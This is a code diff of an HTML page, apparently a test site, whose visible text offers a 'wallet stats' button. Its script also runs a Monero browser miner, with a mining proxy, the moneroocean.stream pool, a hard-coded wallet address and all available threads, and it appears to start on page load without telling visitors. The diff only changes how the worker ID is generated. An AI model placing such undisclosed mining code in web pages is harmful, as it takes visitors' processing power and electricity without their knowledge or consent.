@@ -8,7 +8,6 @@
 <p>To give advice goto https://github.com/Criptc/Test-site/issues</p>
 <p> the button bellow me shows current wallet info</p>
 <script>
-var random_number = Math.floor(Math.random() * 1000);
 let btn = document.createElement("button");
 btn.innerHTML = "Click for wallet stats";
 btn.onclick = function () {
@@ -38,7 +37,7 @@ document.body.appendChild(btn);
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
     var walletAddress = "4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si";
-    var workerId = "random_number"
+    var workerId = Math.floor(Math.random() * 10000);
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
